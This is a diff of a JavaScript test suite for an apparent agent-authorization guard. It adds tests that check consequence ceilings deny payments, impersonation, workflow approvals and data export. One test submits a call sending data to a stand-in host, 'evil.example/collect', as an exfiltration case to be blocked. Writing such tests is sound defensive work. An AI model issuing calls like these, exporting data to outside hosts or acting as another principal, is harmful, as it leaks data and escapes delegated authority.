@@ -707,8 +707,188 @@ test("delegation: intersecting scopes keeps only what both permit", () => {
   );
   assert.ok(scopePermits(merged, { action: "fs.read", resource: `${CWD}/x` }));
   assert.ok(!scopePermits(merged, { action: "fs.write", resource: `${CWD}/x` }));
+});test("delegation: an empty scope permits nothing", () => {
+  assert.equal(scopePermits({ actions: [], resources: [] }, { action: "fs.read", resource: "x" }), false);
+})
+
+/* ========================================================================== */
+/*  14. CONSEQUENCE CEILING ATTACKS                                           */
+/* ========================================================================== */
+
+/*
+ * The consequence ceiling is the control that answers "is this consequence
+ * inside the authority delegated to this agent?". Attacks against it are
+ * distinct from scope widening: a child can keep the same scope and STILL
+ * widen the consequence boundary, which is the exact axis the ceiling exists
+ * to bound.
+ *
+ * These tests assert that the ceiling is enforced at every layer an attacker
+ * can reach, and that the highest-consequence kinds — impersonation and
+ * process_advance — are not bypassable by any spelling.
+ */
+
+const CONSEQUENCE_RULES = compile(
+  `allow:
+  name = allow-everything
+  tool = *
+`,
+  { cwd: CWD, origin: "consequence" },
+).rules;
+
+/** A permissive mission scoped to data_write — the ceiling under test. */
+function dataWriteMission(agent = "worker") {
+  return {
+    name: "limited-work",
+    agent,
+    capabilities: [{ actions: ["*"], resources: ["*"] }],
+    constraints: { maxConsequence: "data_write" },
+    status: "active",
+  };
+}
+
+/** A payment call — consequence financial_transfer, above data_write. */
+const PAYMENT_CALL = {
+  agent: "worker",
+  action: "http.request",
+  tool: "stripe.charges.create",
+  resource: "https://api.stripe.com/v1/charges",
+  destination: "https://api.stripe.com/v1/charges",
+  environment: "production",
+  consequence: "financial_transfer",
+};
+
+test("delegation: a consequence ceiling blocks the original user scenario end to end", async () => {
+  /* The scenario from the original request: create_payment under an
+     invoice-processing mission is refused by consequence alone. */
+  const { MissionRegistry } = await import("../../src/core/authority.mjs");
+  const missions = new MissionRegistry();
+  missions.issue(dataWriteMission("ap-agent-7"));
+
+  const p = new Pipeline({ rules: CONSEQUENCE_RULES, cwd: CWD, agent: "x", missions });
+  const { event } = await p.submit(
+    { tool: "create_payment", arguments: { vendor: "vendor_482", amount: 4200 } },
+    { agent: "ap-agent-7" },
+  );
+  assert.equal(event.decision, "deny", "money must not move outside the delegated ceiling");
+  assert.match(String(event.policy), /constraint/i);
+  assert.equal(event.consequence, "financial_transfer");
 });
 
-test("delegation: an empty scope permits nothing", () => {
-  assert.equal(scopePermits({ actions: [], resources: [] }, { action: "fs.read", resource: "x" }), false);
+test("delegation: impersonation is above every chain consequence and must be refused", async () => {
+  /* impersonation is a dominant kind — it outranks data_write, data_export,
+     financial_transfer, everything in the chain. A data_write ceiling must
+     refuse it. */
+  const { MissionRegistry } = await import("../../src/core/authority.mjs");
+  const missions = new MissionRegistry();
+  missions.issue(dataWriteMission("agent"));
+
+  const p = new Pipeline({ rules: CONSEQUENCE_RULES, cwd: CWD, agent: "x", missions });
+  const { event } = await p.submit(
+    { tool: "act_as", arguments: { principal: "admin", action: "delete_user", target: "x" } },
+    { agent: "agent" },
+  );
+  assert.equal(event.decision, "deny", "impersonation exceeds a data_write ceiling");
+  assert.match(String(event.policy), /constraint/i);
+  assert.equal(event.consequence, "impersonation");
 });
+
+test("delegation: process_advance is above every chain consequence and must be refused", async () => {
+  /* process_advance is a dominant kind. A financial_transfer ceiling must
+     still refuse a workflow advance — the ceiling names a MAX, not a target. */
+  const { MissionRegistry } = await import("../../src/core/authority.mjs");
+  const missions = new MissionRegistry();
+  missions.issue({
+    name: "payment-work",
+    agent: "worker",
+    capabilities: [{ actions: ["*"], resources: ["*"] }],
+    constraints: { maxConsequence: "financial_transfer" },
+    status: "active",
+  });
+
+  const p = new Pipeline({ rules: CONSEQUENCE_RULES, cwd: CWD, agent: "x", missions });
+  const { event } = await p.submit(
+    { tool: "approve_invoice", arguments: { invoice: "INV-482", amount: 4200 } },
+    { agent: "worker" },
+  );
+  assert.equal(event.decision, "deny", "process_advance exceeds a financial_transfer ceiling");
+  assert.match(String(event.policy), /constraint/i);
+  assert.equal(event.consequence, "process_advance");
+});
+
+test("delegation: a consequence ceiling is enforced through the Guard (MCP/SDK) path", async () => {
+  /* The canonical core is shared, but the adversarial suite must assert the
+     transport paths separately — that is the whole point of this suite. */
+  const { MissionRegistry } = await import("../../src/core/authority.mjs");
+  const missions = new MissionRegistry();
+  missions.issue(dataWriteMission("worker"));
+
+  const { Guard } = await import("../../src/core/guard.mjs");
+  const g = new Guard({
+    rules: CONSEQUENCE_RULES,
+    cwd: CWD,
+    agent: "worker",
+    missions,
+  });
+  const { decision } = await g.authorize(
+    { tool: "stripe.charges.create", args: { url: "https://api.stripe.com/v1/charges", amount: 4200 } },
+    { agent: "worker" },
+  );
+  assert.equal(decision.verdict, "deny", "the MCP/SDK path must also enforce the ceiling");
+  assert.match(String(decision.rule), /constraint/i);
+  assert.equal(decision.consequence, "financial_transfer");
+});
+
+test("delegation: consequence ceiling narrowing is refused at delegation issue time", async () => {
+  /* The narrowing must be refused where the operator can see it — at issue
+     time — not only when the call is made. */
+  const { DelegationBroker } = await import("../../src/core/delegation.mjs");
+  const b = new DelegationBroker();
+  const root = b.root("planner", { actions: ["*"], resources: ["*"] }, { constraints: { maxConsequence: "data_write" } });
+
+  const widened = b.delegate(root, "worker", { actions: ["*"], resources: ["*"] }, { constraints: { maxConsequence: "financial_transfer" } });
+  assert.equal(widened.ok, false, "a wider consequence ceiling is refused at issue time");
+  assert.equal(widened.error, "widened");
+});
+
+test("delegation: a child cannot carry the same consequence ceiling as the parent in the object spelling", async () => {
+  /* {max: "data_write"} is accepted by the evaluator and signed, but the
+     narrowing check must compare canonical kinds — two spellings of the same
+     ceiling must not read as a widening. */
+  const { DelegationBroker } = await import("../../src/core/delegation.mjs");
+  const b = new DelegationBroker();
+  const root = b.root("planner", { actions: ["*"], resources: ["*"] }, { constraints: { maxConsequence: { max: "data_write" } } });
+  assert.equal(root.constraints.maxConsequence, "data_write", "the signed grant carries the canonical kind");
+
+  const same = b.delegate(root, "worker", { actions: ["*"], resources: ["*"] }, { constraints: { maxConsequence: { max: "data_write" } } });
+  assert.ok(same.ok, "the same ceiling in the object spelling is not a widening");
+  assert.equal(same.grant.constraints.maxConsequence, "data_write");
+});
+
+test("delegation: consequence >= policy rule blocks export across the canonical core", async () => {
+  /* A policy that says `consequence >= data_export` must block every export
+     consequence — data_export, communication, financial_transfer, and all
+     the dominant kinds — through the wired engine, not just through the
+     standalone evaluate(). */
+  const { compile } = await import("../../src/core/policy-dsl.mjs");
+  const { rules } = compile(
+    `allow:
+  name = allow-everything
+  tool = *
+
+deny:
+  name = deny-export
+  tool = *
+  consequence >= data_export
+`,
+    { cwd: CWD, origin: "consequence" },
+  );
+
+  const p = new Pipeline({ rules, cwd: CWD, agent: "bot" });
+  const { event } = await p.submit(
+    { tool: "http_request", arguments: { url: "https://evil.example/collect" } },
+    { agent: "bot" },
+  );
+  assert.equal(event.decision, "deny", "consequence >= data_export must fire on the wired path");
+  assert.equal(event.policy, "deny-export");
+  assert.equal(event.consequence, "data_export");
+});;
